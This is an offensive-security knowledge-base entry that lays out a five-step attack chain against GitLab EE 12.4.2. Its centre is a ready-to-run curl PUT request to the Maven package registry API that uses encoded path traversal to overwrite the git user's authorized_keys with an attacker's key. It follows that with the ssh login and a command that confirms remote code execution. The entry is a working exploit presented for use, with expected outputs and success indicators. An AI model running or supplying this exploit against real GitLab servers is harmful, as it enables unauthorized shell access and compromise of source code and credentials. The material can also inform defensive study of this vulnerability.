---
tags:
  - path-traversal
  - gitlab
  - rce
  - ssh-key-injection
  - arbitrary-file-write
type: attack_chain
tools:
  - '[[tools/curl]]'
  - '[[tools/ssh]]'
  - '[[tools/gitlab-rake]]'
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
commands:
  - '[[commands/curl-gitlab-package-upload]]'
  - '[[commands/ssh-gitlab-access]]'
  - '[[commands/gitlab-rake-env-info]]'
verified: false
platforms:
  - Linux
  - Web
  - Docker
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Setup-GitLab-Project-and-API-Token]]'
  - '[[procedures/Exploit-Path-Traversal-to-Inject-SSH-Key]]'
  - '[[procedures/Establish-SSH-Access-to-GitLab-Server]]'
step_count: 5
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Network Device Authentication]]'
  - '[[Unix Shell]]'
updated_at: '2025-12-14T17:26:28.010Z'
description: >-
  An authenticated path traversal vulnerability in GitLab's package registry API
  enables arbitrary file writes, exploited to inject an SSH public key for
  remote code execution as the 'git' user.
skill_level: intermediate
impact_level: high
id: d0ce7c99-472d-4148-a626-1aa70841d478
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Network Device Authentication]]'
  - '[[Unix Shell]]'
---
# GitLab Path Traversal in Maven Package Registry Leading to RCE via SSH Key Injection

Multi-stage attack chain demonstrating exploitation of a path traversal vulnerability in GitLab's Maven package registry API to achieve remote code execution via SSH key injection.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 5 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Setup Project and Token] --> B[Exploit Path Traversal]
    B --> C[Inject SSH Key]
    C --> D[Gain SSH Access]
    D --> E[Execute Commands]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#f39c12
    style D fill:#3498db
    style E fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/curl]]
- [[tools/ssh]]
- [[tools/gitlab-rake]]

### Target Environment

- GitLab EE 12.4.2-ee on Linux/Docker
- Ports: 80 (HTTP), 22 (SSH)
- Services: PostgreSQL 10.9, Redis 3.2.12, GitLab Shell 10.2.0
- Tech Stack: Ruby 2.6.3, Git 2.22.0

### Initial Access Requirements

- Authenticated access to GitLab instance with developer privileges
- Valid personal access token with 'api' and 'write_package_registry' scopes
- Attacker's SSH public key file available locally
- Network access to GitLab HTTP (port 80) and SSH (port 22)

## Detailed Attack Procedures

### Step 1: Enable Package Registry
procedure: [[procedures/Setup-GitLab-Project-and-API-Token]]

**Objective**: Prepare the GitLab instance and project for package registry exploitation.

**Instructions**: Enable the package registry feature instance-wide if not already active, then create a project and generate an API token.

**Expected Output**: Project created with package registry enabled; token file containing the personal access token.

**Success Indicators**:
- Package registry visible in project settings
- Token generated and saved to 'token' file

### Step 2: Create Project and Token
procedure: [[procedures/Setup-GitLab-Project-and-API-Token]]

**Objective**: Set up authenticated access for API interactions.

**Instructions**: Use GitLab UI or API to create a project and generate a personal access token with required scopes.

**Expected Output**: Project ID (e.g., 2) and token ready for use.

**Success Indicators**:
- Project exists with package registry enabled
- Token authenticates API requests successfully

### Step 3: Upload File via Path Traversal
procedure: [[procedures/Exploit-Path-Traversal-to-Inject-SSH-Key]]

**Objective**: Exploit the path traversal to write the attacker's SSH public key to the server's .ssh/authorized_keys.

**Instructions**: Execute [[commands/curl-gitlab-package-upload]] to send the malicious PUT request:

```bash
curl -H "Private-Token: $(cat token)" http://10.26.0.5/api/v4/projects/2/packages/maven/a%2fb%2fc%2fd%2fe%2ff%2fg%2fh%2fi%2f1/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f.ssh%2fauthorized_keys -XPUT --path-as-is --data-binary @/home/asakawa/.ssh/id_rsa.pub
```

**Expected Output**: HTTP 200 or 201 response indicating successful upload.

**Success Indicators**:
- No errors in response
- File written to /home/git/.ssh/authorized_keys on server

### Step 4: Connect via SSH
procedure: [[procedures/Establish-SSH-Access-to-GitLab-Server]]

**Objective**: Gain shell access as the 'git' user using the injected key.

**Instructions**: Use [[commands/ssh-gitlab-access]] to connect:

```bash
ssh git@10.26.0.5
```

**Expected Output**: Interactive shell prompt as 'git' user.

**Success Indicators**:
- Successful authentication without password
- Shell access confirmed

### Step 5: Verify Environment
procedure: [[procedures/Establish-SSH-Access-to-GitLab-Server]]

**Objective**: Confirm access and gather environment details.

**Instructions**: Once connected, run [[commands/gitlab-rake-env-info]]:

```bash
gitlab-rake gitlab:env:info
```

**Expected Output**: Detailed output including Ruby 2.6.3, GitLab 12.4.2-ee, PostgreSQL 10.9, etc.

**Success Indicators**:
- Environment info displayed
- RCE achieved

## Attack Chain Summary

### Key Achievements

1. Enabled package registry and setup authenticated project
2. Exploited path traversal to inject SSH key for arbitrary file write
3. Achieved RCE via SSH shell access as 'git' user
4. Verified control with environment info

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]
- [[Network Device Authentication]]
- [[Unix Shell]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Execution]]

---

*Last updated: 2023-10-01T00:00:00Z*
